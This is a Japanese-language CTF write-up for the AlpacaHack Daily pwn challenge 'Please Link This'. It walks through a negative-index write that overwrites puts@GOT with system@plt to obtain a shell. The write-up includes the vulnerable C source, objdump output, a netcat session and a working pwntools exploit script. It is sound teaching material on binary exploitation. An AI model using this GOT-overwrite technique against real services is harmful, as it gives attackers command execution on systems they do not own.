---
title: "Please Link This - AlpacaHack Daily"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "alpacahack", "canary", "pie", "pwntools", "scanf", "objdump"]
summary: "pwn writeup for \"Please Link This\" from AlpacaHack Daily - techniques: alpacahack, canary, pie, pwntools, scanf, objdump."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d16_Please_Link_This/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Please Link This"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Please Link This
- **Date:** 2026-05-16
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d16_Please_Link_This>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d16_Please_Link_This/README.md>

---
# Please Link This

## 問題

pltをつかってみましょう

```c
long values[100], pos;

int main(void) {
    system("figlet \"Welcome Hackers\"");
    printf("pos > ");
    scanf("%ld", &pos);
    if (pos >= 100) {
        puts("You're a hacker!");
        return 1;
    }
    printf("val > ");
    scanf("%ld", &values[pos]);

    puts("/bin/sh; is this what you need?");
}
```

## 概要

実行すると、`Welcome Hackers`というアスキーアート？が表示された後、100未満の`pos`と、グローバル変数`values[pos]`の入力を求められます。

いつもは`main`関数や`scanf`関数の戻り先アドレスをシェルを取れる`win`関数に向けたりしますが、今回はなんとその`win`関数自体がありません。

シェルさえ取れれば`cat /flag.txt`でフラグを得ることができそうですが、どうすればシェルを取ることができるのでしょうか？

## 方針

`/bin/sh; ...`を出力しようとする`puts`関数のGOTエントリを`system@plt`のアドレスに書き換える。

## 解法

```c
    puts("/bin/sh; is this what you need?");
```
の部分ですが、もしこれが`puts`関数ではなく`system`関数であれば、シェルを取ることができそうです。

実際、Ubuntuのターミナルで同じ文字列で実行してみると、
```sh
$ /bin/sh; is this what you need?
$ echo hello
hello
$ exit
コマンド 'is' が見つかりません。次の方法でインストールできます:
sudo apt install ironseed
```
あとでエラーが起こっているものの、とりあえずシェルは取れているようです。

そうすると、`put`関数のGOTエントリを`system`関数のそれに書き換えたいところですが、`system`関数の実体が置かれている場所（GOTエントリ）はわかりません。

なので、GOTエントリではなく、`system@plt`のアドレスに書き換える方向で考えてみます。

問題文が「pltをつかってみましょう」であることからも、この方向性で良さそうな気がします。

そして、最初の`system("figlet \"Welcome Hackers\"");`はこの方法を使えるようにするために使われているのでしょう。

まずは、バイナリファイルから必要な情報を集めます。

```sh
$ nm chal | grep values
0000000000404060 B values
$ objdump -R chal | grep puts
0000000000404000 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
$ objdump -d chal | grep system@plt
00000000004010a0 <system@plt>:
  4011c8:       e8 d3 fe ff ff          call   4010a0 <system@plt>
```

`puts`のGOTが`values[0]`の位置より`0x404060 - 0x404000 = 0x60 = 96`だけ前に配置されることがわかりました。

`long`型のサイズは`8`バイトなので、`96 ÷ 8 = 12`より、`values[-12]`の位置にあることになります。

この`pos = -12`は`pos >= 100`の条件を満たさないので、バリデーションチェックで弾かれません。

ここに`0x4010a0 = 4198560`を書き込めばよさそうです。

※`-no-pie`オプションがついているので、これらの値は固定のはずです。

入力する値がわかったところで、まずはローカル環境でターミナルから実行してみます。

```
$ nc localhost 9999
__        __   _                            _   _            _
\ \      / /__| | ___ ___  _ __ ___   ___  | | | | __ _  ___| | _____ _ __ ___
 \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | |_| |/ _` |/ __| |/ / _ \ '__/ __|
  \ V  V /  __/ | (_| (_) | | | | | |  __/ |  _  | (_| | (__|   <  __/ |  \__ \
   \_/\_/ \___|_|\___\___/|_| |_| |_|\___| |_| |_|\__,_|\___|_|\_\___|_|  |___/

pos > -12
val > 4198560
cat /flag.txt
Alpaca{REDACTED}
exit
sh: 1: is: not found
```

できました！

## elf解析について

今回、よくわからなくてずっと避けていた`pwntools`のelf解析に勇気を出して（？）挑戦してみました。

イメージとしては、リモートの接続先にあるのと同じバイナリファイルを手元にカンペとして置いておくような感じですね。

コマンドで調べるより直感的に値を取れるし、取った値をそのまま計算に使えるので、慣れたら便利そうです。

※実行するときは、配布の`chal`をカレントディレクトリに置いておく必要があります。

```py
import pwn

HOST, PORT = 'localhost', 9999
#HOST, PORT = '34.170.146.252', 25168

e = pwn.ELF('chal')
values_adr = e.symbols['values']
puts_got = e.got['puts']
system_plt = e.plt['system']
pos = (puts_got - values_adr) // 8

print(f"{values_adr = }")
print(f"{puts_got = }")
print(f"{system_plt = }")
print(f"{pos = }")

p = pwn.remote(HOST, PORT)
p.sendlineafter(b"pos > ", str(pos).encode())
p.sendlineafter(b"val > ", str(system_plt).encode())
p.interactive()
```

```
[*] 'C:\\ctf\\please-link-this\\chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
values_adr = 4210784
puts_got = 4210688
system_plt = 4198564
pos = -12
[x] Opening connection to localhost on port 9999
[x] Opening connection to localhost on port 9999: Trying ::1
[+] Opening connection to localhost on port 9999: Done
[*] Switching to interactive mode
cat /flag.txt
Alpaca{REDACTED}
```

※この方法だと`system@plt`内の`jmp`命令を直接指すらしく、コマンドで調べた時のアドレスと少し差異が出るようです。
